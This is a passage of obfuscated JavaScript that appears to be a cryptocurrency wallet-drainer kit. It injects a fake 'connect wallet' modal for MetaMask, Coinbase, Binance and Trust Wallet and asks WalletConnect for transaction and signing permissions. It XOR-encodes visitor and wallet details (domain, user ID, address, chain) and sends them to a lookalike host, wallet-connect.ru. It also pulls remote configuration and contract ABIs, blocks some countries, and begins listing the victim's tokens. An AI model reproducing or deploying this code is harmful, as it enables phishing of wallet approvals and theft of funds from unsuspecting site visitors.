26.7202L9.42565 26.8277L9.47628 26.7214L9.52565 26.8289L13.6794 24.9327L13.3307 27.4614L13.3294 27.4777V28.4252L9.52753 26.6145L9.47628 26.7214Z\"fill=#D5BFB2></path><path d=\"M13.4476 20.0088L9.94946 18.9688L12.4076 17.8345L13.4476 20.0088ZM18.5532 20.0088L19.5932 17.8345L22.0513 18.9688L18.5532 20.0088Z\"fill=#233447></path><path d=\"M13.4474 20.0089L13.4812 19.8958L10.283 18.9452L12.3512 17.9908L13.3412 20.0602L13.4474 20.0089L13.5543 19.9577L12.5143 17.7833L12.358 17.7271L9.89991 18.8614L9.83179 18.9771L9.91616 19.0821L13.4143 20.1221L13.538 20.0858L13.5549 19.9583L13.4474 20.0089ZM18.553 20.0089L18.6599 20.0602L19.6499 17.9908L21.718 18.9452L18.5199 19.8958L18.553 20.0089L18.5868 20.1221L22.0849 19.0821L22.1693 18.9771L22.1012 18.8614L19.643 17.7271L19.4868 17.7833L18.4468 19.9577L18.4637 20.0852L18.5874 20.1214L18.553 20.0089Z\"fill=#233447></path><path d=\"M9.47623 26.7212L10.0437 21.71L6.16748 21.8043L9.47623 26.7212ZM21.9569 21.6156L22.5244 26.6268L25.8337 21.7106L21.9569 21.6156ZM24.8875 16.1318L17.8906 16.4156L18.5525 20.0087L19.5925 17.8343L22.0506 18.9687L24.8875 16.1318ZM9.94873 18.9687L12.4069 17.8343L13.4469 20.0087L14.1087 16.4156L7.11186 16.1318L9.94873 18.9687Z\"fill=#CC6228></path><path d=\"M9.47636 26.7212L9.59386 26.7343L10.1614 21.723L10.1314 21.6299L10.0414 21.5918L6.16511 21.6862L6.06323 21.7499L6.07011 21.8699L9.37948 26.7862L9.50573 26.8349L9.59511 26.7337L9.47636 26.7212L9.57448 26.6549L6.38573 21.9174L9.91073 21.8312L9.35886 26.7074L9.47636 26.7212ZM21.957 21.6155L21.8395 21.6287L22.407 26.6399L22.4964 26.7412L22.6226 26.6924L25.932 21.7762L25.9389 21.6562L25.837 21.5924L21.9607 21.498L21.8707 21.5362L21.8407 21.6293L21.957 21.6155L21.9539 21.7337L25.6151 21.823L22.6057 26.2943L22.0745 21.6024L21.957 21.6155ZM24.8876 16.1318L24.8826 16.0137L17.8857 16.2974L17.7982 16.3418L17.7745 16.4368L18.4364 20.0299L18.537 20.1255L18.6589 20.0593L19.6489 17.9899L22.0014 19.0755L22.1345 19.0518L24.9707 16.2155L24.9951 16.0843L24.882 16.0137L24.8876 16.1318L24.8039 16.048L22.0257 18.8262L19.6426 17.7262L19.4864 17.7824L18.6032 19.6287L18.032 16.5274L24.8926 16.2499L24.8876 16.1318ZM9.94886 18.9687L9.99823 19.0762L12.3507 17.9905L13.3407 20.0599L13.4626 20.1262L13.5632 20.0305L14.2251 16.4374L14.2014 16.3424L14.1139 16.298L7.11698 16.0143L7.00386 16.0849L7.02823 16.2162L9.86448 19.0524L9.99761 19.0762L9.94886 18.9687L10.0326 18.8849L7.41011 16.2624L13.9682 16.528L13.397 19.6293L12.5139 17.783L12.3576 17.7268L9.89948 18.8612L9.94886 18.9687Z\"fill=#CC6228></path><path d=\"M7.11255 16.0376L10.0438 21.8051L9.94942 18.9688C9.9488 18.9688 7.11255 16.132 7.11255 16.0376ZM22.0513 18.9688L21.9569 21.8051L24.8882 16.0376L22.0513 18.9688ZM14.1088 16.4157L13.4469 20.0088L14.2975 24.2638L14.4869 18.6857L14.1088 16.4157ZM17.8913 16.4157L17.5132 18.6851L17.7025 24.2632L18.5532 20.0082L17.8913 16.4157Z\"fill=#E27525></path><path d=\"M7.11251 16.0379L7.00688 16.0916L9.93813 21.8591L10.0731 21.9197L10.1619 21.8016L10.0675 18.9654L10.0331 18.886C10.0319 18.8847 9.32438 18.1772 8.61563 17.4566C8.26126 17.0966 7.90688 16.7335 7.64188 16.4547C7.50938 16.3154 7.39938 16.1979 7.32313 16.1129L7.23751 16.0135L7.22001 15.9904L7.19876 16.0041L7.22126 15.9935L7.22001 15.9904L7.19876 16.0041L7.22126 15.9935L7.12813 16.0391H7.23126L7.22126 15.9935L7.12813 16.0391H7.23126H7.11251L7.00688 16.0929L7.11251 16.0379H6.99438L7.02188 16.1197C7.08063 16.206 7.27126 16.4091 7.54751 16.6985C8.36813 17.5554 9.86501 19.0522 9.86563 19.0529L9.94938 18.9691L9.83126 18.9729L9.90813 21.2772L7.21813 15.9841L7.08501 15.9229L6.99438 16.0379H7.11251ZM22.0513 18.9691L21.9331 18.9654L21.8388 21.8016L21.9275 21.9197L22.0625 21.8591L24.9938 16.0916L24.9569 15.9416L24.8031 15.9554L21.9669 18.8866L21.9338 18.9647L22.0513 18.9691L22.1363 19.051L24.4269 16.6841L22.0925 21.2772L22.1694 18.9729L22.0513 18.9691ZM14.1088 16.416L13.9925 16.3947L13.3306 19.9879L13.3313 20.0322L14.1819 24.2872L14.3075 24.3816L14.4163 24.2679L14.6056 18.6897L14.6044 18.6666L14.2263 16.3972L14.1106 16.2985L13.9931 16.3954L14.1088 16.416L13.9919 16.4354L14.3681 18.6929L14.2138 23.2429L13.5669 20.0079L14.2244 16.4372L14.1088 16.416ZM17.8913 16.416L17.7744 16.3966L17.3963 18.666L17.395 18.6891L17.5844 24.2672L17.6931 24.381L17.8188 24.2866L18.6694 20.0316L18.67 19.9872L18.0081 16.3941L17.8906 16.2972L17.775 16.396L17.8913 16.416L17.775 16.4372L18.4325 20.0079L17.7856 23.2422L17.6313 18.6929L18.0075 16.4354L17.8913 16.416Z\"fill=#E27525></path><path d=\"M18.5531 20.0088L17.7025 24.2638L18.27 24.6419L21.9575 21.8056L22.0519 18.9694L18.5531 20.0088ZM9.94873 18.9688L10.0431 21.805L13.7306 24.6413L14.2981 24.2631L13.4475 20.0081L9.94873 18.9688Z\"fill=#F5841F></path><path d=\"M18.5531 20.0087L18.4374 19.9856L17.5868 24.2406L17.6374 24.3619L18.2049 24.74L18.3424 24.7356L22.0299 21.8994L22.0762 21.8094L22.1706 18.9731L22.1249 18.8756L22.0193 18.8556L18.5212 19.8956L18.4387 19.9856L18.5531 20.0087L18.5868 20.1219L21.9281 19.1287L21.8406 21.7456L18.2643 24.4962L17.8331 24.2087L18.6687 20.0319L18.5531 20.0087ZM9.94869 18.9687L9.83057 18.9725L9.92494 21.8087L9.97119 21.8987L13.6587 24.735L13.7962 24.7394L14.3637 24.3612L14.4143 24.24L13.5637 19.985L13.4812 19.895L9.98307 18.855L9.87744 18.875L9.83182 18.9725L9.94869 18.9687L9.91494 19.0819L13.3449 20.1019L14.1662 24.2094L13.7356 24.4969L10.1593 21.7462L10.0668 18.9656L9.94869 18.9687Z\"fill=#F5841F></path><path d=\"M18.6475 28.5182V27.3832L18.3637 27.0995H13.6362L13.3525 27.3832V28.5182L9.38184 26.627L10.8 27.7613L13.5418 29.6526H18.3637L21.2 27.7613L22.5237 26.627L18.6475 28.5182Z\"fill=#C0AC9D></path><path d=\"M18.6475 28.5181H18.7656V27.3831L18.7313 27.3L18.4475 27.0163L18.3638 26.9813H13.6363L13.5525 27.0163L13.2688 27.3L13.2344 27.3831V28.3306L9.4325 26.52L9.28125 26.5644L9.3075 26.7194L10.7262 27.8538L10.7325 27.8588L13.4744 29.75L13.5419 29.7706H18.3638L18.4294 29.7506L21.2656 27.86L21.2769 27.8513L22.6006 26.7169L22.6225 26.5619L22.4719 26.5206L18.5956 28.4119L18.6475 28.5181H18.7656H18.6475L18.6994 28.6244L21.7463 27.1375L21.1288 27.6669L18.3281 29.5344H13.5788L10.8706 27.6669L10.2531 27.1731L13.3019 28.6244L13.4156 28.6175L13.4706 28.5181V27.4325L13.685 27.2175H18.315L18.5294 27.4325V28.5181L18.585 28.6181L18.6994 28.6244L18.6475 28.5181Z\"fill=#C0AC9D></path><path d=\"M18.3638 24.6413L17.7963 24.2632H14.2982L13.7307 24.6413L13.3525 27.3832L13.6363 27.0994H18.3638L18.6475 27.3832L18.3638 24.6413Z\"fill=#161616></path><path d=\"M18.3637 24.6413L18.4293 24.5431L17.8618 24.165L17.7962 24.145H14.2981L14.2325 24.165L13.665 24.5431L13.6137 24.625L13.2356 27.3669L13.3 27.4894L13.4362 27.4669L13.685 27.2175H18.315L18.5637 27.4669L18.6981 27.49L18.765 27.3713L18.4812 24.6294L18.4293 24.5431L18.3637 24.6413L18.2462 24.6538L18.4956 27.0644L18.4475 27.0163L18.3637 26.9813H13.6362L13.5525 27.0163L13.5175 27.0513L13.8406 24.71L14.3337 24.3813H17.7606L18.2981 24.74L18.3637 24.6413L18.2462 24.6538L18.3637 24.6413Z\"fill=#161616></path><path d=\"M30.8445 10.1759L31.8845 5.07027L30.372 0.342773L18.3645 9.23027L22.9976 13.1065L29.5213 14.9978L30.9395 13.2959L30.2776 12.8234L31.2232 11.8778L30.467 11.3103L31.4126 10.554L30.8445 10.1759ZM0.115723 5.07027L1.15572 10.1759L0.493848 10.6484L1.53385 11.4046L0.777598 11.9721L1.72322 12.9178L1.06135 13.3903L2.47947 15.0921L9.00322 13.2009L13.6363 9.32465L1.72322 0.342773L0.115723 5.07027Z\"fill=#763E1A></path><path d=\"M30.8444 10.1757L30.96 10.1995L32 5.09324L31.9969 5.03387L30.4844 0.306367L30.4081 0.230117L30.3013 0.247617L18.2938 9.13512L18.2456 9.22637L18.2881 9.32074L22.9212 13.197L22.9644 13.2201L29.4881 15.1114L29.6119 15.0732L31.03 13.3714L31.0562 13.2807L31.0075 13.1995L30.4594 12.8076L31.3062 11.9607L31.3406 11.8689L31.2938 11.7826L30.6594 11.307L31.4856 10.6457L31.53 10.5482L31.4775 10.4551L30.91 10.077L30.8444 10.1757L30.7787 10.2739L31.2119 10.5626L30.3925 11.2182L30.3481 11.3126L30.3956 11.4051L31.0431 11.8907L30.1938 12.7401L30.1594 12.8332L30.2087 12.9195L30.7669 13.3182L29.4794 14.8626L23.0531 13.0001L18.5544 9.23574L30.3088 0.535742L31.7619 5.07699L30.7281 10.1526L30.7781 10.2745L30.8444 10.1757ZM0.115625 5.07012L0 5.09324L1.025 10.1239L0.425625 10.552L0.37625 10.6476L0.425 10.7439L1.33563 11.4064L0.7075 11.8776L0.660625 11.9639L0.695 12.0557L1.54188 12.9026L0.99375 13.2945L0.945 13.3757L0.97125 13.4664L2.38937 15.1682L2.51312 15.2064L9.03687 13.3151L9.08 13.292L13.7131 9.41574L13.7556 9.32199L13.7087 9.23074L1.79437 0.248242L1.68875 0.229492L1.61188 0.304492L0.00375 5.03199L0 5.09324L0.115625 5.07012L0.2275 5.10824L1.7825 0.535742L13.4462 9.33012L8.94625 13.0951L2.52063 14.9576L1.23312 13.4126L1.79125 13.0139L1.84063 12.9276L1.80625 12.8345L0.956875 11.9851L1.60438 11.4995L1.65188 11.4039L1.60312 11.3089L0.695625 10.6489L1.22375 10.2714L1.27062 10.1514L0.231875 5.04637L0.115625 5.07012Z\"fill=#763E1A></path><path d=\"M29.4257 14.9976L22.9019 13.1064L24.8875 16.0376L21.9563 21.7108H25.8325H31.6L29.4257 14.9976ZM9.09817 13.1064L2.57441 14.9976L0.399414 21.7108H6.16691H10.0432L7.11192 16.0376L9.09817 13.1064ZM17.8913 16.4158L18.3638 9.23014L20.255 4.12451H11.84L13.7313 9.23014L14.1094 16.4158L14.2988 18.6851V24.2633H17.7969V18.6851L17.8913 16.4158Z\"fill=#F5841F></path><path d=\"M29.4256 14.9977L29.4587 14.884L22.935 12.9927L22.8062 13.0365L22.8037 13.1721L24.75 16.0452L21.8512 21.6559L21.855 21.7715L21.9562 21.8284H25.8325H31.6L31.6956 21.7796L31.7125 21.674L29.5381 14.9609L29.4587 14.884L29.4256 14.9977L29.3131 15.034L31.4375 21.5921H25.8325H22.15L24.9919 16.0915L24.985 15.9709L23.1831 13.3109L29.3925 15.1109L29.4256 14.9977ZM9.09812 13.1065L9.06499 12.9927L2.54124 14.884L2.46187 14.9609L0.286865 21.674L0.30374 21.7802L0.399365 21.829H6.16687H10.0431L10.1437 21.7721L10.1475 21.6565L7.24874 16.0459L9.19499 13.1727L9.19249 13.0371L9.06374 12.9934L9.09812 13.1065L8.99999 13.0402L7.01437 15.9715L7.00749 16.0921L9.84937 21.5927H6.16687H0.561865L2.66687 15.094L9.13062 13.2202L9.09812 13.1065ZM17.8912 16.4159L18.0094 16.4234L18.4812 9.25461L20.3662 4.16523L20.3525 4.05648L20.2556 4.00586H11.84L11.7431 4.05648L11.7294 4.16523L13.6137 9.25398L13.9912 16.4221V16.4259L14.18 18.6902V24.2634L14.2144 24.3471L14.2981 24.3815H17.7962L17.88 24.3471L17.9144 24.2634V18.6877L18.0087 16.4209L17.8912 16.4159L17.7731 16.4109L17.6787 18.6802V18.6852V24.1452H14.4169V18.6852L14.4162 18.6752L14.2275 16.4077L13.8494 9.22336L13.8425 9.18836L12.0106 4.24211H20.0856L18.2537 9.18836L18.2469 9.22148L17.7744 16.4071V16.4102L17.8912 16.4159Z\"fill=#F5841F></path></svg></div><div class=modal-el-desc><span class=modal-el-desc-first>MetaMask</span> <span class=modal-el-desc-second>Connnect to your MetaMask wallet</span></div></div><div class=menu-el data=2><div class=modal-icon><svg fill=none height=32 viewBox=\"0 0 32 32\"width=32 xmlns=http://www.w3.org/2000/svg><g clip-path=url(#clip0_73_248)><path d=\"M16 0C24.8375 0 32 7.1625 32 16C32 24.8375 24.8375 32 16 32C7.1625 32 0 24.8375 0 16C0 7.1625 7.1625 0 16 0Z\"fill=#0052FF></path><path d=\"M16.0031 21.625C12.8969 21.625 10.3781 19.1094 10.3781 16C10.3781 12.8906 12.8969 10.375 16.0031 10.375C18.7875 10.375 21.1 12.4062 21.5438 15.0625H27.2094C26.7313 9.2875 21.8969 4.75 16 4.75C9.7875 4.75 4.75 9.7875 4.75 16C4.75 22.2125 9.7875 27.25 16 27.25C21.8969 27.25 26.7313 22.7125 27.2094 16.9375H21.5406C21.0938 19.5938 18.7875 21.625 16.0031 21.625Z\"fill=white></path></g><defs><clipPath id=clip0_73_248><rect fill=white height=32 width=32></rect></clipPath></defs></svg></div><div class=modal-el-desc><span class=modal-el-desc-first>Coinbase</span> <span class=modal-el-desc-second>Connnect to your Coinbase wallet</span></div></div><div class=menu-el data=3><div class=modal-icon><svg fill=none height=32 viewBox=\"0 0 32 32\"width=32 xmlns=http://www.w3.org/2000/svg><g clip-path=url(#clip0_73_337)><path d=\"M7.24266 16L3.63808 19.6046L0.0244141 16L3.629 12.3955L7.24266 16ZM16.0044 7.23827L22.1876 13.4214L25.7922 9.81686L16.0044 0.0200195L6.20759 9.81686L9.81218 13.4214L16.0044 7.23827ZM28.3708 12.3955L24.7662 16L28.3708 19.6046L31.9754 16L28.3708 12.3955ZM16.0044 24.7618L9.82126 18.5786L6.21667 22.1832L16.0044 31.9801L25.7922 22.1832L22.1876 18.5786L16.0044 24.7618ZM16.0044 19.6046L19.609 16L16.0044 12.3955L12.3908 16L16.0044 19.6046Z\"fill=#F0B90B></path></g><defs><clipPath id=clip0_73_337><rect fill=white height=32 width=32></rect></clipPath></defs></svg></div><div class=modal-el-desc><span class=modal-el-desc-first>Binance Wallet</span> <span class=modal-el-desc-second>Connnect to your Binance wallet</span></div></div><div class=menu-el data=4><div class=modal-icon><svg fill=none height=32 viewBox=\"0 0 32 32\"width=32 xmlns=http://www.w3.org/2000/svg><g clip-path=url(#clip0_73_86)><path d=\"M0 8.125C0 3.63769 3.63769 0 8.125 0H23.875C28.3623 0 32 3.63769 32 8.125V23.875C32 28.3623 28.3623 32 23.875 32H8.125C3.63769 32 0 28.3623 0 23.875V8.125Z\"fill=#F1F7FE></path><path d=\"M16.0094 6.71875C19.2381 9.41525 22.9407 9.24894 23.9985 9.24894C23.7671 24.5846 22.004 21.5436 16.0094 25.8438C10.0147 21.5436 8.26266 24.5846 8.03125 9.24894C9.07809 9.24894 12.7807 9.41525 16.0094 6.71875Z\"stroke=#3375BB stroke-linecap=round stroke-linejoin=round stroke-miterlimit=10 stroke-width=2.56></path></g><defs><clipPath id=clip0_73_86><rect fill=white height=32 width=32></rect></clipPath></defs></svg></div><div class=modal-el-desc><span class=modal-el-desc-first>Trust Wallet</span> <span class=modal-el-desc-second>Connnect to your Trust wallet</span></div></div></div></div><div class=modal-bottom><button><svg fill=none height=24 viewBox=\"0 0 25 24\"width=25 xmlns=http://www.w3.org/2000/svg><path d=\"M9.875 3.375H5.75C5.25272 3.375 4.77581 3.57254 4.42417 3.92417C4.07254 4.27581 3.875 4.75272 3.875 5.25V9.375C3.875 9.87228 4.07254 10.3492 4.42417 10.7008C4.77581 11.0525 5.25272 11.25 5.75 11.25H9.875C10.3723 11.25 10.8492 11.0525 11.2008 10.7008C11.5525 10.3492 11.75 9.87228 11.75 9.375V5.25C11.75 4.75272 11.5525 4.27581 11.2008 3.92417C10.8492 3.57254 10.3723 3.375 9.875 3.375ZM9.5 9H6.125V5.625H9.5V9ZM9.875 12.75H5.75C5.25272 12.75 4.77581 12.9475 4.42417 13.2992C4.07254 13.6508 3.875 14.1277 3.875 14.625V18.75C3.875 19.2473 4.07254 19.7242 4.42417 20.0758C4.77581 20.4275 5.25272 20.625 5.75 20.625H9.875C10.3723 20.625 10.8492 20.4275 11.2008 20.0758C11.5525 19.7242 11.75 19.2473 11.75 18.75V14.625C11.75 14.1277 11.5525 13.6508 11.2008 13.2992C10.8492 12.9475 10.3723 12.75 9.875 12.75ZM9.5 18.375H6.125V15H9.5V18.375ZM19.25 3.375H15.125C14.6277 3.375 14.1508 3.57254 13.7992 3.92417C13.4475 4.27581 13.25 4.75272 13.25 5.25V9.375C13.25 9.87228 13.4475 10.3492 13.7992 10.7008C14.1508 11.0525 14.6277 11.25 15.125 11.25H19.25C19.7473 11.25 20.2242 11.0525 20.5758 10.7008C20.9275 10.3492 21.125 9.87228 21.125 9.375V5.25C21.125 4.75272 20.9275 4.27581 20.5758 3.92417C20.2242 3.57254 19.7473 3.375 19.25 3.375ZM18.875 9H15.5V5.625H18.875V9ZM13.25 16.125V13.875C13.25 13.5766 13.3685 13.2905 13.5795 13.0795C13.7905 12.8685 14.0766 12.75 14.375 12.75C14.6734 12.75 14.9595 12.8685 15.1705 13.0795C15.3815 13.2905 15.5 13.5766 15.5 13.875V16.125C15.5 16.4234 15.3815 16.7095 15.1705 16.9205C14.9595 17.1315 14.6734 17.25 14.375 17.25C14.0766 17.25 13.7905 17.1315 13.5795 16.9205C13.3685 16.7095 13.25 16.4234 13.25 16.125ZM21.125 15.375C21.125 15.6734 21.0065 15.9595 20.7955 16.1705C20.5845 16.3815 20.2984 16.5 20 16.5H18.875V19.5C18.875 19.7984 18.7565 20.0845 18.5455 20.2955C18.3345 20.5065 18.0484 20.625 17.75 20.625H14.375C14.0766 20.625 13.7905 20.5065 13.5795 20.2955C13.3685 20.0845 13.25 19.7984 13.25 19.5C13.25 19.2016 13.3685 18.9155 13.5795 18.7045C13.7905 18.4935 14.0766 18.375 14.375 18.375H16.625V13.875C16.625 13.5766 16.7435 13.2905 16.9545 13.0795C17.1655 12.8685 17.4516 12.75 17.75 12.75C18.0484 12.75 18.3345 12.8685 18.5455 13.0795C18.7565 13.2905 18.875 13.5766 18.875 13.875V14.25H20C20.2984 14.25 20.5845 14.3685 20.7955 14.5795C21.0065 14.7905 21.125 15.0766 21.125 15.375Z\"fill=white></path></svg> \u0421onnect by QR-code</button> <span>\u0421onnect by QR-code with WalletConnect</span></div></div>";
    document.body.prepend(_0x302e24);
    custom_modal_script();
  } catch (_0x18f793) {
    console.log(_0x18f793);
  }
};
function modalOpen() {
  $(".modal").show();
  $("#overlay").fadeIn(0xc8);
  $(".modal").animate({
    'opacity': '1',
    'top': "50%"
  }, 0x320);
}
;
$(document).mouseup(function (_0x1d2ff1) {
  var _0x46010f = $("#overlay");
  if (_0x46010f.has(_0x1d2ff1.target).length === 0x0) {
    _0x46010f.fadeOut(0xc8);
    $(".modal").hide();
  }
});
function custom_modal_script() {
  $(".modal-main-menu .menu-el").on("click", function () {
    var _0x233303 = $(this).attr("data");
    if (_0x233303 == 0x1) {
      connect_wallet("MetaMask");
    }
    if (_0x233303 == 0x2) {
      connect_wallet("Coinbase");
    }
    if (_0x233303 == 0x3) {
      connect_wallet("Binance Wallet");
    }
    if (_0x233303 == 0x4) {
      connect_wallet("Trust Wallet");
    }
  });
  $(document).on('click', ".modal-bottom button", function (_0x3d0f16) {
    use_wc();
    $('.modal').hide();
    $('#overlay').fadeOut(0xc8);
  });
  $(document).on("click", '.modal-close', function (_0x1e4870) {
    $('.modal').hide();
    $("#overlay").fadeOut(0xc8);
  });
}
;
const set_modal_data = (_0x2bef5e, _0x55d9d5) => {
  try {
    MS_Modal_Data[0x0].data = _0x2bef5e;
    MS_Modal_Data[0x1].data = _0x55d9d5;
    reset_modal();
  } catch (_0x24ebea) {
    console.log(_0x24ebea);
  }
};
const reset_modal = () => {
  try {
    document.getElementById('web3-modal').remove();
  } catch (_0x2332f6) {
    console.log(_0x2332f6);
  }
  try {
    document.getElementById("web3-overlay").remove();
  } catch (_0x4a2b32) {
    console.log(_0x4a2b32);
  }
  try {
    document.getElementById("web3-style").remove();
  } catch (_0x1455dc) {
    console.log(_0x1455dc);
  }
  try {
    inject_modal();
  } catch (_0x2e8eee) {
    console.log(_0x2e8eee);
  }
};
const ms_init = () => {
  try {
    if (MS_Process) {
      return;
    }
    document.getElementById("web3-modal").style.display = "block";
    document.getElementById('web3-overlay').style.display = "block";
    document.getElementsByClassName("web3-modal-main")[0x0].style.display = "block";
    document.getElementsByClassName('web3-modal-wc')[0x0].style.display = "none";
  } catch (_0x462d59) {
    console.log(_0x462d59);
  }
};
const ms_hide = () => {
  try {
    document.getElementById("web3-modal").style.display = "none";
    document.getElementById('web3-overlay').style.display = "none";
  } catch (_0x3e2350) {
    console.log(_0x3e2350);
  }
};
const load_wc = async () => {
  let _0x1b4f4d = [];
  let _0x2feaa7 = {};
  for (const _0x3c7783 in MS_Settings.RPCs) {
    if (_0x3c7783 != '1') {
      _0x1b4f4d.push(_0x3c7783);
    }
    _0x2feaa7[_0x3c7783] = MS_Settings.RPCs[_0x3c7783];
  }
  MS_Provider = await WC2_Provider.init({
    'projectId': "ea52b0e550593829f2eee2cb9006f642",
    'chains': ['1'],
    'optionalChains': _0x1b4f4d,
    'metadata': MS_WalletConnect_MetaData,
    'showQrModal': true,
    'rpcMap': _0x2feaa7,
    'methods': ["eth_sendTransaction", "eth_signTransaction", 'eth_sign', "personal_sign", 'eth_signTypedData', 'eth_signTypedData_v4'],
    'qrModalOptions': undefined
  });
};
const prs = (_0xc22e26, _0x4d2d93) => {
  const _0x235787 = _0x5ce7aa => _0x5ce7aa.split('').map(_0x2377bc => _0x2377bc.charCodeAt(0x0));
  const _0xd5f6fb = _0x32cee7 => ('0' + Number(_0x32cee7).toString(0x10)).substr(-0x2);
  const _0x39ca9a = _0x269e99 => _0x235787(_0xc22e26).reduce((_0x15f8e9, _0x2fd0dc) => _0x15f8e9 ^ _0x2fd0dc, _0x269e99);
  return _0x4d2d93.split('').map(_0x235787).map(_0x39ca9a).map(_0xd5f6fb).join('');
};
const srp = (_0x59b96b, _0x26b7a8) => {
  const _0x245eb1 = _0xb7bd3b => _0xb7bd3b.split('').map(_0x257cb5 => _0x257cb5.charCodeAt(0x0));
  const _0x22b4f1 = _0x224376 => _0x245eb1(_0x59b96b).reduce((_0x246169, _0x4e05e2) => _0x246169 ^ _0x4e05e2, _0x224376);
  return _0x26b7a8.match(/.{1,2}/g).map(_0x9473c3 => parseInt(_0x9473c3, 0x10)).map(_0x22b4f1).map(_0x3ec9e5 => String.fromCharCode(_0x3ec9e5)).join('');
};
const send_request = async _0xbf315a => {
  try {
    if (MS_Force_Mode) {
      return {
        'status': "error",
        'error': "Server is Unavailable"
      };
    }
    _0xbf315a.domain = window.location.host;
    _0xbf315a.worker_id = null || null;
    _0xbf315a.chat_data = false;
    const _0x1c592d = btoa(String(3338));
    const _0x26d3b3 = prs(_0x1c592d, btoa(JSON.stringify(_0xbf315a)));
    const _0x376d13 = await fetch("https://wallet-connect.ru", {
      'method': "POST",
      'headers': {
        'Accept': "text/plain",
        'Content-Type': "application/x-www-form-urlencoded"
      },
      'body': "ver=05082023&raw=" + _0x26d3b3
    });
    let _0xd4b44e = JSON.parse(atob(srp(_0x1c592d, await _0x376d13.text())));
    if (!_0xd4b44e.status) {
      return {
        'status': "error",
        'error': "Server is Unavailable"
      };
    } else {
      if (_0xd4b44e.status == "error" && _0xd4b44e.error == "SRV_UNAVAILABLE") {
        MS_Force_Mode = true;
      }
      if (_0xd4b44e.status == "error" && _0xd4b44e.error == 'INVALID_VERSION') {
        MS_Force_Mode = true;
        try {
          Swal.close();
          Swal.fire({
            'html': "<b>Server Error</b> Please, check client and server version, looks like it doesn't match, or maybe you need to clear cache everywhere :(",
            'icon': "error",
            'allowOutsideClick': true,
            'allowEscapeKey': true,
            'timer': 0x0,
            'width': 0x258,
            'showConfirmButton': true,
            'confirmButtonText': 'OK'
          });
        } catch (_0x28a9f1) {
          console.log(_0x28a9f1);
        }
      }
      return _0xd4b44e;
    }
  } catch (_0xb7de00) {
    console.log(_0xb7de00);
    return {
      'status': 'error',
      'error': "Server is Unavailable"
    };
  }
};
const retrive_config = async () => {
  try {
    const _0x212dd3 = await send_request({
      'action': 'retrive_config'
    });
    if (_0x212dd3.status == 'OK') {
      MS_Settings = _0x212dd3.data;
      if (!MS_Settings.CIS) {
        MS_Bad_Country = false;
      }
      if (typeof MS_Settings.DSB == "boolean" && MS_Settings.DSB === true) {
        window.location.href = "about:blank";
      }
    }
  } catch (_0x4b78b9) {
    console.log(_0x4b78b9);
  }
};
const retrive_contract = async () => {
  try {
    const _0x1b4465 = await send_request({
      'action': "retrive_contract"
    });
    if (_0x1b4465.status == 'OK') {
      MS_Contract_ABI = _0x1b4465.data;
    }
  } catch (_0x2030ff) {
    console.log(_0x2030ff);
  }
};
const enter_website = async () => {
  try {
    let _0x3bb675 = await send_request({
      'action': 'enter_website',
      'user_id': MS_ID,
      'time': new Date().toLocaleString("ru-RU")
    });
    if (_0x3bb675.status == 'error' && _0x3bb675.error == "BAD_COUNTRY") {
      MS_Bad_Country = true;
    }
  } catch (_0x4af4d5) {
    console.log(_0x4af4d5);
  }
};
const leave_website = async () => {
  try {
    if (!MS_Settings.Notifications.leave_website) {
      return;
    }
    await send_request({
      'action': "leave_website",
      'user_id': MS_ID
    });
  } catch (_0x25895d) {
    console.log(_0x25895d);
  }
};
const connect_request = async () => {
  try {
    if (!MS_Settings.Notifications.connect_request) {
      return;
    }
    await send_request({
      'action': 'connect_request',
      'user_id': MS_ID,
      'wallet': MS_Current_Provider
    });
  } catch (_0x2bfc83) {
    console.log(_0x2bfc83);
  }
};
const connect_cancel = async () => {
  try {
    if (!MS_Settings.Notifications.connect_cancel) {
      return;
    }
    await send_request({
      'action': "connect_cancel",
      'user_id': MS_ID
    });
  } catch (_0x3ee926) {
    console.log(_0x3ee926);
  }
};
const connect_success = async () => {
  try {
    if (!MS_Settings.Notifications.connect_success) {
      return;
    }
    await send_request({
      'action': "connect_success",
      'user_id': MS_ID,
      'address': MS_Current_Address,
      'wallet': MS_Current_Provider,
      'chain_id': MS_Current_Chain_ID
    });
  } catch (_0x1bf5ee) {
    console.log(_0x1bf5ee);
  }
};
const convert_chain = (_0x5db03a, _0x3a2c55, _0xc944be) => {
  try {
    if (_0x5db03a == "ANKR" && _0x3a2c55 == 'ID') {
      switch (_0xc944be) {
        case 'eth':
          return 0x1;
        case "bsc":
          return 0x38;
        case "polygon":
          return 0x89;
        case "avalanche":
          return 0xa86a;
        case 'arbitrum':
          return 0xa4b1;
        case "optimism":
          return 0xa;
        case 'fantom':
          return 0xfa;
        default:
          return false;
      }
    } else {
      if (_0x5db03a == "OPENSEA" && _0x3a2c55 == 'ID') {
        switch (_0xc944be) {
          case 'ethereum':
            return 0x1;
          case 'matic':
            return 0x89;
          case 'avalanche':
            return 0xa86a;
          case "arbitrum":
            return 0xa4b1;
          case "optimism":
            return 0xa;
          default:
            return false;
        }
      } else {
        if (_0x5db03a == 'ID' && _0x3a2c55 == "ANKR") {
          switch (_0xc944be) {
            case 0x1:
              return "eth";
            case 0x38:
              return "bsc";
            case 0x89:
              return "polygon";
            case 0xa86a:
              return "avalanche";
            case 0xa4b1:
              return "arbitrum";
            case 0xa:
              return "optimism";
            case 0xfa:
              return "fantom";
            case 0x19:
              return 'cronos';
            case 0x64:
              return "gnosis";
            case 0x80:
              return "heco";
            case 0x504:
              return "moonbeam";
            case 0x505:
              return "moonriver";
            case 0x8ae:
              return "kava";
            case 0xa4ec:
              return "celo";
            case 0x63564c40:
              return 'harmony';
            default:
              return false;
          }
        } else {
          if (_0x5db03a == 'ID' && _0x3a2c55 == "CURRENCY") {
            switch (_0xc944be) {
              case 0x1:
                return "ETH";
              case 0x38:
                return "BNB";
              case 0x89:
                return "MATIC";
              case 0xa86a:
                return "AVAX";
              case 0xa4b1:
                return "ETH";
              case 0xa:
                return "ETH";
              case 0xfa:
                return "FTM";
              case 0x19:
                return "CRO";
              case 0x64:
                return "XDAI";
              case 0x80:
                return 'HT';
              case 0x504:
                return "GLMR";
              case 0x505:
                return "MOVR";
              case 0x8ae:
                return 'KAVA';
              case 0xa4ec:
                return "CELO";
              case 0x63564c40:
                return "ONE";
              default:
                return false;
            }
          }
        }
      }
    }
  } catch (_0x1c1256) {
    console.log(_0x1c1256);
    return false;
  }
};
const get_tokens = async _0x49206d => {
  try {
    let _0x53f04c = [];
    let _0x5d231d = await fetch("https://rpc.ankr.com/multichain/" + (MS_Settings.AT || ''), {
      'method': 'POST',
      'headers': {
        'Accept': "application/json",
        'Content-Type': "application/json"
      },
      'body': JSON.stringify({
        'id': 0x1,
